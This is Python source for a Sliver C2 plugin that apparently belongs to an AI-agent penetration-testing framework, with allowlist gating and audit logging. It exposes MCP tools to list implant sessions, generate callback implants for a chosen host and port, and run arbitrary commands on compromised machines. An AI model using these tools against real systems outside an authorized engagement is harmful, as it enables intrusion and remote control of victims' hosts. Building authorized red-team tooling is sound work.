"""Sliver C2 bridge plugin for BreachPilot.

Mirrors tools/metasploit_bridge.py for modern C2 (implant generation, team
server control, session management) via the Sliver gRPC client.

SAFETY (lab build):
* Plugin is OFF by default; opt in via ``config plugins.enabled``.
* Every target-touching MCP tool is wrapped with ``ctx.require_allowlist()`` so
  the target-IP allowlist lock + JSONL audit trail apply automatically.
* Sliver callback hosts (the team server's listener address) are TARGET-SIDE:
  the operator must add them to ``exploit.allowed_targets`` explicitly. The
  plugin NEVER auto-authorizes a callback host. Use exact ``host:port``, never
  a wildcard.
* No log clearing, timestomping, EDR/AV defeat, DoS, or malware distribution.
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import threading
from pathlib import Path
from typing import Any

from tools.plugins import Plugin, PluginManifest, PluginRegistry

log = logging.getLogger("plugins.sliver_c2")

_MANIFEST_PATH = Path(__file__).resolve().parent / "plugin.yaml"


# ---------------------------------------------------------------------------
# Lazy gRPC client import
# ---------------------------------------------------------------------------

_SLIVER_CLIENT = None  # type: Any | None
_CLIENT_LOCK = threading.Lock()


def _get_sliver_client(config: dict[str, Any] | None) -> Any | None:
    """Return a cached Sliver gRPC client instance, or None on failure.

    Reads connection info from ``config["sliver_c2"]`` (grpc_host, grpc_port,
    config_path). The operator must already be running a Sliver team server
    and have a valid config file at ``config_path``. Importing the sliver
    client is best-effort: when the dependency is absent the plugin degrades
    rather than aborting sibling plugins.
    """
    global _SLIVER_CLIENT
    with _CLIENT_LOCK:
        if _SLIVER_CLIENT is not None:
            return _SLIVER_CLIENT
        try:
            from sliver import SliverClient  # type: ignore
        except ImportError:
            log.warning("sliver_c2: 'sliver' python package not installed; plugin tools will refuse")
            return None
        cfg_block = (config or {}).get("sliver_c2") or {}
        cfg_path = str(cfg_block.get("config_path", "~/.sliver/config"))
        host = str(cfg_block.get("grpc_host", "127.0.0.1"))
        port = int(cfg_block.get("grpc_port", 31337))
        expanded = os.path.expanduser(cfg_path)
        try:
            client = SliverClient(config_path=expanded, host=host, port=port)
            client.connect()
            _SLIVER_CLIENT = client
            return _SLIVER_CLIENT
        except Exception as exc:  # noqa: BLE001
            log.warning("sliver_c2: failed to connect to team server: %s", exc)
            return None


def _reset_client_cache() -> None:
    """Test hook: drop the cached client so a new one can be built."""
    global _SLIVER_CLIENT
    with _CLIENT_LOCK:
        _SLIVER_CLIENT = None


# ---------------------------------------------------------------------------
# Session / implant data models
# ---------------------------------------------------------------------------


class SliverSessionInfo:
    """Plain-old-data holder for a Sliver session. Avoids @dataclass so the
    plugin can be loaded by importlib.util without sys.modules registration."""

    __slots__ = (
        "session_id",
        "remote_address",
        "hostname",
        "username",
        "os",
        "transport",
        "last_checkin",
        "status",
    )

    def __init__(self, **kwargs: Any) -> None:
        for slot in self.__slots__:
            setattr(self, slot, kwargs.get(slot, "" if slot != "last_checkin" else 0.0))

    def to_dict(self) -> dict[str, Any]:
        return {slot: getattr(self, slot) for slot in self.__slots__}


def _parse_sessions(raw: Any) -> list[SliverSessionInfo]:
    """Best-effort coercion of the sliver client's Sessions response to a list."""
    out: list[SliverSessionInfo] = []
    items = list(raw) if isinstance(raw, (list, tuple)) else [raw]
    for item in items:
        if item is None:
            continue
        try:
            out.append(
                SliverSessionInfo(
                    session_id=str(getattr(item, "ID", getattr(item, "SessionID", "")) or ""),
                    remote_address=str(getattr(item, "RemoteAddress", "") or ""),
                    hostname=str(getattr(item, "Hostname", "") or ""),
                    username=str(getattr(item, "Username", "") or ""),
                    os=str(getattr(item, "OS", getattr(item, "Os", "")) or ""),
                    transport=str(getattr(item, "Transport", "") or ""),
                    last_checkin=float(getattr(item, "LastCheckin", 0.0) or 0.0),
                    status=str(getattr(item, "Status", "active") or "active"),
                )
            )
        except Exception:  # noqa: BLE001
            continue
    return out


# ---------------------------------------------------------------------------
# CLI fallback for environments without the python client
# ---------------------------------------------------------------------------


def _run_sliver_cli(argv: list[str], timeout: int = 60) -> tuple[str, int | None, str]:
    """Invoke the sliver CLI binary directly as a fallback path.

    The sliver python package is preferred; this is only used when the
    operator has the binary but not the python bindings.
    """
    binary = shutil.which("sliver") or "sliver"
    cmd = [binary, "operator"] + argv
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        return proc.stdout, proc.returncode, proc.stderr
    except subprocess.TimeoutExpired as exc:
        return "", None, f"TIMEOUT after {timeout}s: {exc}"
    except FileNotFoundError:
        return "", None, "sliver binary not found on PATH"
    except Exception as exc:  # noqa: BLE001
        return "", None, f"sliver cli error: {exc}"


# ---------------------------------------------------------------------------
# Plugin
# ---------------------------------------------------------------------------


class SliverC2Plugin(Plugin):
    """Plugin wrapper that registers the Sliver C2 MCP tools."""

    manifest: PluginManifest

    def __init__(self) -> None:
        self.manifest = self._load_manifest()

    @staticmethod
    def _load_manifest() -> PluginManifest:
        text = _MANIFEST_PATH.read_text(encoding="utf-8")
        from tools.plugins import _parse_manifest_yaml  # type: ignore

        return PluginManifest.from_dict(_parse_manifest_yaml(text))

    def register(self, registry: PluginRegistry) -> None:
        registry.register_mcp_tools(_register_sliver_tools)


def _register_sliver_tools(mcp: Any, ctx: Any) -> None:
    """Register Sliver C2 MCP tools. Every tool is allowlist-gated via ctx."""
    require_allowlist = ctx.require_allowlist
    workspace = ctx.workspace
    config = ctx.config

    @mcp.tool()
    @require_allowlist(target_param="target_ip", audit=True)
    def sliver_list_sessions(target_ip: str) -> str:
        """List active Sliver implant sessions that have called back to the team server.

        The Sliver team server address is the operator's callback host and MUST
        be added to exploit.allowed_targets (exact host:port, never a wildcard)
        before this tool is invoked. This tool only queries the team server
        state; it does not generate implants or touch the target_ip beyond the
        allowlist gate.
        """
        client = _get_sliver_client(config)
        if client is None:
            # Fallback to CLI if python bindings are absent.
            out, rc, err = _run_sliver_cli(["sessions"], timeout=30)
            if rc is None or rc != 0:
                return f"SLIVER_SESSIONS_ERROR: {err or out}"
            return f"SLIVER_SESSIONS_RESULT:\n{out}"
        try:
            raw = client.sessions()
            sessions = _parse_sessions(raw)
        except Exception as exc:  # noqa: BLE001
            return f"SLIVER_SESSIONS_ERROR: {exc}"
        if not sessions:
            return "SLIVER_SESSIONS_RESULT: no active sessions"
        lines = ["SLIVER_SESSIONS_RESULT:"]
        for s in sessions:
            lines.append(
                f"  {s.session_id} | {s.remote_address} | {s.hostname} | "
                f"{s.username}@{s.os} | {s.transport} | {s.status}"
            )
        return "\n".join(lines)

    @mcp.tool()
    @require_allowlist(target_param="target_ip", audit=True)
    def sliver_generate_implant(
        target_ip: str,
        callback_host: str,
        callback_port: int = 443,
        os_name: str = "linux",
        arch: str = "amd64",
        format: str = "executable",
    ) -> str:
        """Generate a Sliver implant binary for delivery to target_ip.

        The callback_host (the team server's listener address) is target-side
        and MUST be in exploit.allowed_targets (exact host:port). The
        generated binary is written under the per-target workspace
        (exploit_workspace/<target_ip>/) for delivery via the exploit agent.
        """
        client = _get_sliver_client(config)
        # Validate callback_host is in the operator allowlist. The decorator
        # already gated target_ip; the callback host is a separate destination
        # so we re-check it here.
        from tools.mcp_shared import _check_allowlist  # type: ignore

        allowed_ok, why = _check_allowlist(callback_host, config)
        if not allowed_ok:
            return (
                f"BLOCKED: callback_host {callback_host} not in exploit.allowed_targets\n"
                f"REASON: {why}\n"
                f"NOTE: Add the exact host:port of your Sliver team server to "
                f"exploit.allowed_targets before generating implants."
            )

        try:
            attempt_dir, attempt_id = _attempt_dir_safe(workspace)
        except Exception as exc:  # noqa: BLE001
            return f"BLOCKED: workspace setup failed: {exc}"

        if client is None:
            # Fallback to CLI: build a config snippet for sliver-operator.
            cfg_lines = [
                f"sliver > generate --os {os_name} --arch {arch} "
                f"--format {format} --lhost {callback_host} --lport {callback_port} "
                f"--save {attempt_dir}",
            ]
            out, rc, err = _run_sliver_cli(["-e", "\n".join(cfg_lines)], timeout=120)
            if rc is None or rc != 0:
                return f"SLIVER_GENERATE_ERROR: {err or out}"
            return (
                f"SLIVER_GENERATE_RESULT: success\n"
                f"ATTEMPT_ID: {attempt_id}\n"
                f"CALLBACK: {callback_host}:{callback_port}\n"
                f"TARGET: {target_ip}\n"
                f"OUTPUT: {out}"
            )
        try:
            # ponytail: gRPC generate path is the client's generate() call.
            # When sliver client API changes, swap the kwargs below.
            implant_path = client.generate(
                os=os_name,
                arch=arch,
                format=format,
                lhost=callback_host,
                lport=callback_port,
                save_path=str(attempt_dir),
            )
        except Exception as exc:  # noqa: BLE001
            return f"SLIVER_GENERATE_ERROR: {exc}"
        return (
            f"SLIVER_GENERATE_RESULT: success\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"CALLBACK: {callback_host}:{callback_port}\n"
            f"TARGET: {target_ip}\n"
            f"IMPLANT_PATH: {implant_path}"
        )

    @mcp.tool()
    @require_allowlist(target_param="target_ip", audit=True)
    def sliver_interact_session(target_ip: str, session_id: str, command: str) -> str:
        """Run a single command on an active Sliver implant session.

        The session must already exist on the team server. The command is
        run on the remote host; the allowlist gates the target_ip. Commands
        that pivot to other hosts are subject to the terminal target-lock
        semantics (the operator is responsible for not pivoting past the
        authorized target).
        """
        if not session_id or not session_id.strip():
            return "BLOCKED: session_id is required."
        if not command or not command.strip():
            return "BLOCKED: command is required."
        client = _get_sliver_client(config)
        if client is None:
            out, rc, err = _run_sliver_cli(
                ["-e", f"sliver > use {session_id}\nsliver({session_id}) > {command}\n"],
                timeout=60,
            )
            if rc is None or rc != 0:
                return f"SLIVER_INTERACT_ERROR: {err or out}"
            return f"SLIVER_INTERACT_RESULT:\n{out}"
        try:
            # ponytail: gRPC interact path - single command, not an interactive shell.
            # Ceiling: long-running commands will block the gRPC stream; upgrade path
            # is an async streaming wrapper when throughput matters.
            result = client.interact(session_id.strip(), command.strip())
        except Exception as exc:  # noqa: BLE001
            return f"SLIVER_INTERACT_ERROR: {exc}"
        return f"SLIVER_INTERACT_RESULT:\n{result}"


def _attempt_dir_safe(workspace: Path) -> tuple[Path, str]:
    """Build a per-attempt directory under the workspace and return (path, id)."""
    from tools.mcp_shared import _attempt_dir

    return _attempt_dir(workspace)


def create_plugin() -> Plugin:
    """Factory invoked by PluginManager when loading this plugin."""
    return SliverC2Plugin()
